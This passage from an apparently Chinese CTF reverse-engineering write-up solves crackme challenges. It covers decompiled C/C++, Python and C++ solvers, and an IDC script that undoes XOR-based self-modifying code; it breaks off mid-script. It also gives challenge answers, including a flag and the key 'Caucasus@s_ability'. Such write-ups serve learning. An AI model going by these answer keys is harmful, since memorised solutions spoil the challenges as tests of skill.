<span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">26</span>, <span class="hljs-number">13</span>, <span class="hljs-number">4</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>, <span class="hljs-number">21</span>, <span class="hljs-number">14</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">28</span>, <span class="hljs-number">12</span>, <span class="hljs-number">28</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">2</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>, <span class="hljs-number">30</span>, <span class="hljs-number">23</span>,</span><br><span class="line">                    <span class="hljs-number">19</span>, <span class="hljs-number">9</span>, <span class="hljs-number">22</span>, <span class="hljs-number">31</span></span><br><span class="line">            };</span><br><span class="line"></span><br><span class="line">    a puVar3[<span class="hljs-number">32</span>];</span><br><span class="line">    a *DAT_00403378 = puVar3;</span><br><span class="line">    a *s[<span class="hljs-number">0x12</span>]= {<span class="hljs-literal">nullptr</span>};</span><br><span class="line">    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">do</span> {</span><br><span class="line">        puVar3[i].val = dword_402178[i];</span><br><span class="line">        puVar3[i].loc1 = &amp;puVar3[dword_402278[i]];</span><br><span class="line">        puVar3[i].loc2 = &amp;puVar3[dword_4021F8[i]];</span><br><span class="line">        i++;</span><br><span class="line">    } <span class="hljs-keyword">while</span> (i &lt; <span class="hljs-number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-built_in">dfs</span>(DAT_00403378, &amp;puVar3[<span class="hljs-number">31</span>], <span class="hljs-number">0x10</span>, s);</span><br><span class="line">    DAT_00403378 = puVar3;</span><br><span class="line">    string flag;</span><br><span class="line">    <span class="hljs-keyword">int</span> DAT_00403374 = <span class="hljs-number">48</span>;</span><br><span class="line">    <span class="hljs-keyword">char</span> tmp;</span><br><span class="line">    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0x10</span>; j++)</span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-keyword">if</span>(s[<span class="hljs-number">0xf</span>-j]==DAT_00403378-&gt;loc1)</span><br><span class="line">        {</span><br><span class="line">            tmp=DAT_00403378-&gt;val + DAT_00403374;</span><br><span class="line">            DAT_00403378=DAT_00403378-&gt;loc1;</span><br><span class="line"></span><br><span class="line">        } <span class="hljs-keyword">else</span>{</span><br><span class="line">            tmp=DAT_00403374 - DAT_00403378-&gt;val;</span><br><span class="line">            DAT_00403378=DAT_00403378-&gt;loc2;</span><br><span class="line">        }</span><br><span class="line">        flag+=tmp;</span><br><span class="line">        DAT_00403374 = tmp;</span><br><span class="line">    }</span><br><span class="line">    cout&lt;&lt;flag&lt;&lt;endl;</span><br><span class="line"><span class="hljs-comment">//    int input[0x15];</span></span><br><span class="line"><span class="hljs-comment">//    int iVar4 = 5;</span></span><br><span class="line"><span class="hljs-comment">//    int DAT_00403374 = 48;</span></span><br><span class="line"><span class="hljs-comment">//    do {</span></span><br><span class="line"><span class="hljs-comment">//        int cVar1 = input[iVar4];</span></span><br><span class="line"><span class="hljs-comment">//        if (DAT_00403378-&gt;val + DAT_00403374 == cVar1) {</span></span><br><span class="line"><span class="hljs-comment">//            DAT_00403378 = DAT_00403378-&gt;loc1;</span></span><br><span class="line"><span class="hljs-comment">//        } else {</span></span><br><span class="line"><span class="hljs-comment">//            if (DAT_00403374 - DAT_00403378-&gt;val == cVar1) {</span></span><br><span class="line"><span class="hljs-comment">//                DAT_00403378 = DAT_00403378-&gt;loc2;</span></span><br><span class="line"><span class="hljs-comment">//            }</span></span><br><span class="line"><span class="hljs-comment">//        }</span></span><br><span class="line"><span class="hljs-comment">//        DAT_00403374 = input[iVar4];</span></span><br><span class="line"><span class="hljs-comment">//        iVar4 = iVar4 + 1;</span></span><br><span class="line"><span class="hljs-comment">//    } while (iVar4 &lt; 0x15);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//    if (((((input[0] == 'f') &amp;&amp; (input[1] == 'l')) &amp;&amp; (input[2] == 'a')) &amp;&amp;</span></span><br><span class="line"><span class="hljs-comment">//         ((input[3] == 'g' &amp;&amp; (input[4] == '{')))) &amp;&amp; (input[0x14] == '}')) {</span></span><br><span class="line"><span class="hljs-comment">//        if (DAT_00403378 == &amp;puVar3[31]) {</span></span><br><span class="line"><span class="hljs-comment">//            string s = "Congratulations!!\n";</span></span><br><span class="line"><span class="hljs-comment">//        }</span></span><br><span class="line"><span class="hljs-comment">//    }</span></span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-built_in">fun</span>();</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>注释部分是对于程序的一个正向还原，寻路用到了<code>dfs</code>算法，不是很难。</p><p>最后得到flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{d<span class="hljs-number">8</span>b<span class="hljs-number">0</span>bc<span class="hljs-number">97</span>a<span class="hljs-number">6</span>c<span class="hljs-number">0</span>ba<span class="hljs-number">27</span>}</span><br></pre></td></tr></tbody></table></figure><h4 id="天津垓"><a href="#天津垓" class="headerlink" title="天津垓"></a>天津垓</h4><p>题目里所有的内容都是假面骑士……</p><p>首先可以关注到一个函数名为<code>f</code> 的函数，这个函数很简单</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">f</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  _main(a1, (__int64)a2, (__int64)a3);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Authorize:"</span>);</span><br><span class="line">  <span class="hljs-built_in">sub_1004011F6</span>();</span><br><span class="line">  <span class="hljs-built_in">sub_100401AA0</span>();</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_1004011F6</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> v1; <span class="hljs-comment">// [rsp+20h] [rbp-D0h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v2; <span class="hljs-comment">// [rsp+21h] [rbp-CFh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v3; <span class="hljs-comment">// [rsp+22h] [rbp-CEh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v4; <span class="hljs-comment">// [rsp+23h] [rbp-CDh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [rsp+24h] [rbp-CCh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v6; <span class="hljs-comment">// [rsp+25h] [rbp-CBh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v7; <span class="hljs-comment">// [rsp+26h] [rbp-CAh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v8; <span class="hljs-comment">// [rsp+27h] [rbp-C9h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v9; <span class="hljs-comment">// [rsp+28h] [rbp-C8h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v10; <span class="hljs-comment">// [rsp+29h] [rbp-C7h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v11; <span class="hljs-comment">// [rsp+2Ah] [rbp-C6h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v12; <span class="hljs-comment">// [rsp+2Bh] [rbp-C5h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v13; <span class="hljs-comment">// [rsp+2Ch] [rbp-C4h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v14; <span class="hljs-comment">// [rsp+2Dh] [rbp-C3h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v15; <span class="hljs-comment">// [rsp+2Eh] [rbp-C2h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v16; <span class="hljs-comment">// [rsp+2Fh] [rbp-C1h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v17; <span class="hljs-comment">// [rsp+30h] [rbp-C0h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v18; <span class="hljs-comment">// [rsp+31h] [rbp-BFh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> Format[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+38h] [rbp-B8h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v20[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+3Dh] [rbp-B3h]</span></span><br><span class="line">  __int64 v21; <span class="hljs-comment">// [rsp+40h] [rbp-B0h]</span></span><br><span class="line">  __int64 v22; <span class="hljs-comment">// [rsp+48h] [rbp-A8h]</span></span><br><span class="line">  __int16 v23; <span class="hljs-comment">// [rsp+50h] [rbp-A0h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v24; <span class="hljs-comment">// [rsp+52h] [rbp-9Eh]</span></span><br><span class="line">  __int64 v25; <span class="hljs-comment">// [rsp+60h] [rbp-90h]</span></span><br><span class="line">  __int64 v26; <span class="hljs-comment">// [rsp+68h] [rbp-88h]</span></span><br><span class="line">  __int64 v27; <span class="hljs-comment">// [rsp+70h] [rbp-80h]</span></span><br><span class="line">  __int64 v28; <span class="hljs-comment">// [rsp+78h] [rbp-78h]</span></span><br><span class="line">  __int64 v29; <span class="hljs-comment">// [rsp+80h] [rbp-70h]</span></span><br><span class="line">  __int16 v30; <span class="hljs-comment">// [rsp+88h] [rbp-68h]</span></span><br><span class="line">  __int64 v31; <span class="hljs-comment">// [rsp+90h] [rbp-60h]</span></span><br><span class="line">  __int64 v32; <span class="hljs-comment">// [rsp+98h] [rbp-58h]</span></span><br><span class="line">  __int64 v33; <span class="hljs-comment">// [rsp+A0h] [rbp-50h]</span></span><br><span class="line">  __int64 v34; <span class="hljs-comment">// [rsp+A8h] [rbp-48h]</span></span><br><span class="line">  __int64 v35; <span class="hljs-comment">// [rsp+B0h] [rbp-40h]</span></span><br><span class="line">  __int64 v36; <span class="hljs-comment">// [rsp+B8h] [rbp-38h]</span></span><br><span class="line">  __int64 v37; <span class="hljs-comment">// [rsp+C0h] [rbp-30h]</span></span><br><span class="line">  __int64 v38; <span class="hljs-comment">// [rsp+C8h] [rbp-28h]</span></span><br><span class="line">  __int64 v39; <span class="hljs-comment">// [rsp+DCh] [rbp-14h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v40; <span class="hljs-comment">// [rsp+E4h] [rbp-Ch]</span></span><br><span class="line">  __int16 v41; <span class="hljs-comment">// [rsp+E8h] [rbp-8h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v42; <span class="hljs-comment">// [rsp+EAh] [rbp-6h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v43; <span class="hljs-comment">// [rsp+EBh] [rbp-5h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+ECh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v39 = <span class="hljs-string">'H_gnisiR'</span>;</span><br><span class="line">  v40 = <span class="hljs-string">'eppo'</span>;</span><br><span class="line">  v41 = <span class="hljs-string">'!r'</span>;</span><br><span class="line">  v42 = <span class="hljs-number">0</span>;</span><br><span class="line">  v31 = <span class="hljs-string">'eht nehW'</span>;</span><br><span class="line">  v32 = <span class="hljs-string">'oh evif '</span>;</span><br><span class="line">  v33 = <span class="hljs-string">'sorc snr'</span>;</span><br><span class="line">  v34 = <span class="hljs-string">'g eht ,s'</span>;</span><br><span class="line">  v35 = <span class="hljs-string">'os nedlo'</span>;</span><br><span class="line">  v36 = <span class="hljs-string">'HT reidl'</span>;</span><br><span class="line">  v37 = <span class="hljs-string">'si RESUO'</span>;</span><br><span class="line">  v38 = <span class="hljs-string">'\n.nrob '</span>;</span><br><span class="line">  v25 = <span class="hljs-string">'t pmuj A'</span>;</span><br><span class="line">  v26 = <span class="hljs-string">'ks eht o'</span>;</span><br><span class="line">  v27 = <span class="hljs-string">' snrut y'</span>;</span><br><span class="line">  v28 = <span class="hljs-string">'dir a ot'</span>;</span><br><span class="line">  v29 = <span class="hljs-string">'.kcik re'</span>;</span><br><span class="line">  v30 = <span class="hljs-string">'\n'</span>;</span><br><span class="line">  v21 = <span class="hljs-string">'etneserP'</span>;</span><br><span class="line">  v22 = <span class="hljs-string">'IAZ yb d'</span>;</span><br><span class="line">  v23 = <span class="hljs-string">'\nA'</span>;</span><br><span class="line">  v24 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">strcpy</span>(v20, <span class="hljs-string">"%s"</span>);</span><br><span class="line">  <span class="hljs-built_in">strcpy</span>(Format, <span class="hljs-string">"%20s"</span>);</span><br><span class="line">  v1 = <span class="hljs-number">17</span>;</span><br><span class="line">  v2 = <span class="hljs-number">8</span>;</span><br><span class="line">  v3 = <span class="hljs-number">6</span>;</span><br><span class="line">  v4 = <span class="hljs-number">10</span>;</span><br><span class="line">  v5 = <span class="hljs-number">15</span>;</span><br><span class="line">  v6 = <span class="hljs-number">20</span>;</span><br><span class="line">  v7 = <span class="hljs-number">42</span>;</span><br><span class="line">  v8 = <span class="hljs-number">59</span>;</span><br><span class="line">  v9 = <span class="hljs-number">47</span>;</span><br><span class="line">  v10 = <span class="hljs-number">3</span>;</span><br><span class="line">  v11 = <span class="hljs-number">47</span>;</span><br><span class="line">  v12 = <span class="hljs-number">4</span>;</span><br><span class="line">  v13 = <span class="hljs-number">16</span>;</span><br><span class="line">  v14 = <span class="hljs-number">72</span>;</span><br><span class="line">  v15 = <span class="hljs-number">62</span>;</span><br><span class="line">  v16 = <span class="hljs-number">0</span>;</span><br><span class="line">  v17 = <span class="hljs-number">7</span>;</span><br><span class="line">  v18 = <span class="hljs-number">16</span>;</span><br><span class="line">  <span class="hljs-built_in">scanf</span>(Format, Str);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(Str) != <span class="hljs-number">18</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">printf</span>(v20, &amp;v25);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">17</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    v43 = ~(Str[i] &amp; *((_BYTE *)&amp;v39 + i % <span class="hljs-number">14</span>)) &amp; (Str[i] | *((_BYTE *)&amp;v39 + i % <span class="hljs-number">14</span>));</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v43 != *(&amp;v1 + i) )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">printf</span>(v20, &amp;v25);</span><br><span class="line">      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">printf</span>(v20, &amp;v31);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(v20, &amp;v21);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里进行了简单的验证，中间得处理过程不是很好逆，因为涉及到与或非三种运算符，但是通过列真值表可以发现，这一串运算实际上和一个异或是一样的，所以这一部分就很好处理了</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="hljs-string">'Rising_Hopper!'</span></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line">v1 = [<span class="hljs-number">17</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">20</span>, <span class="hljs-number">42</span>, <span class="hljs-number">59</span>, <span class="hljs-number">47</span>, <span class="hljs-number">3</span>, <span class="hljs-number">47</span>, <span class="hljs-number">4</span>, <span class="hljs-number">16</span>, <span class="hljs-number">72</span>, <span class="hljs-number">62</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">16</span>]</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(v1[i] ^ <span class="hljs-built_in">ord</span>(target[i % <span class="hljs-number">14</span>]))</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>输出<code>Caucasus@s_ability</code>，尝试提交发现不对，这题应该没这么简单，在找找有没有遗漏的地方，然后通过<code>Str</code>的交叉引用结果找到了遗漏的部分</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_100401A6C</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-built_in">sub_100401506</span>(sub_10040164D, <span class="hljs-number">1045</span>, (__int64)Str);</span><br><span class="line">  <span class="hljs-built_in">sub_10040162B</span>();</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sub_10040164D</span>();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这个函数在输入并验证过<code>Str</code>之后又调用了我们的输入，肯定还会有后续的处理</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">BOOL __fastcall <span class="hljs-title">sub_100401506</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *a1, <span class="hljs-keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  BOOL result; <span class="hljs-comment">// eax</span></span><br><span class="line">  DWORD flOldProtect; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line">  LPVOID lpAddress; <span class="hljs-comment">// [rsp+40h] [rbp+10h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// [rsp+48h] [rbp+18h]</span></span><br><span class="line">  __int64 v8; <span class="hljs-comment">// [rsp+50h] [rbp+20h]</span></span><br><span class="line"></span><br><span class="line">  lpAddress = a1;</span><br><span class="line">  v7 = a2;</span><br><span class="line">  v8 = a3;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(Str) != <span class="hljs-number">18</span> )</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">VirtualProtect</span>(lpAddress, v7, <span class="hljs-number">0x40</span>u, &amp;flOldProtect) )</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v7; ++i )</span><br><span class="line">    *((_BYTE *)lpAddress + i) ^= *(_BYTE *)(i % <span class="hljs-number">18</span> + v8);</span><br><span class="line">  result = <span class="hljs-built_in">VirtualProtect</span>(lpAddress, v7, flOldProtect, &amp;flOldProtect);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !result )</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里是经过处理之后的内容，实际上是对一个地址上的数据进行了处理，显然是一个<code>SMC</code>的过程，这个地址里存储的应该是有用的处理代码，我们输入的内容实际上也只是对数据解密的密钥而已，所以接下来写个IDC脚本来解密一下</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">auto</span> start, end, addr;</span><br><span class="line">    <span class="hljs-keyword">auto</span> v1 = <span class="hljs-number">67</span>;</span><br><span class="line">    <span class="hljs-keyword">auto</span> v2 = <span class="hljs-number">97</span>;</span><br><span class="line">    <span class="hljs-keyword">auto</span> v3 = <span class="hljs-number">117</span>;</span><br><span class="line">    <span class="hljs-keyword">auto</span> v4 = <span class="hljs-number">99</span>;</span><br><span class="line">    <span class="hljs-keyword">auto</span> v5 = <span class="hljs-number">97</span>;</span><br><span class="line">    <span class="hljs-keyword">auto</span> v6 = <span class="hljs-number">115</span>;</span><br><span class="line">    <span class="hljs-keyword">auto</span> v7 = <span class="hljs-number">117</span>;</span><br><span class="line">    <span class="hljs-keyword">auto</span> v8 = <span class="hljs-number">115</span>;</span><br><span class="line">    <span class="hljs-keyword">auto</span> v9 = <span class="hljs-number">64</span>;</span><br><span class="line">    <span class="hljs-keyword">auto</span> v10 = <span class="hljs-number">115</span>;</span><br><span class="line">    <span class="hljs-keyword">auto</span> v11 = <span class="hljs-number">95</span>;</span><br><span class="line">    <span class="hljs-keyword">auto</span> v12 = <span class="hljs-number">97</span>;</span><br><span class="line">    <span class="hljs-keyword">auto</span> v13 = <span class="hljs-number">98</span>;</span><br><span class="line">    <span class="hljs-keyword">auto</span> v14 = <span class="hljs-number">105</span>;</span><br><span class="line">    <span class="hljs-keyword">auto</span> v15 = <span class="hljs-number">108</span>;</span><br><span class="line">    <span class="hljs-keyword">auto</span> v16 = <span class="hljs-number">105</span>;</span><br><span class="line">    <span class="hljs-keyword">auto</span> v17 = <span class="hljs-number">116</span>;</span><br><span class="line">    <span class="hljs-keyword">auto</span> v18 = <span class="hljs-number">121</span>;</span><br><span class="line">    start = <span class="hljs-number">0x10040164D</span>;</span><br><span class="line">    end = <span class="hljs-number">0x100401A68</span>;</span><br><span class="line"><span class="hljs-comment">//    auto flag = "Caucasus@s_ability";</span></span><br><span class="line">    <span class="hljs-keyword">auto</span> flag;</span><br><span class="line">    <span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> (addr = start; addr &lt; end; addr++) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">18</span> == <span class="hljs-number">0</span>)</span><br><span class="line">            flag = v1;</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">18</span> == <span class="hljs-number">1</span>)</span><br><span class="line">            flag = v2;</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">18</span> == <span class="hljs-number">2</span>)</span><br><span class="line">            flag = v3;</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">18</span> == <span class="hljs-number">3</span>)</span><br><span class="line">            flag = v4;</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">18</span> == <span class="hljs-number">4</span>)</span><br><span class="line">            flag = v5;</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">18</span> == <span class="hljs-number">5</span>)</span><br><span class="line">            flag = v6;</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">18</span> == <span class="hljs-number">6</span>)</span><br><span class="line">            flag = v7;</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">18</span> == <span class="hljs-number">7</span>)</span><br><span class="line">            flag = v8;</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">18</span> == <span class="hljs-number">8</span>)</span><br><span class="line">            flag = v9;</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">18</span> == <span class="hljs-number">9</span>)</span><br><span class="line">            flag = v10;</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">18</span> == <span 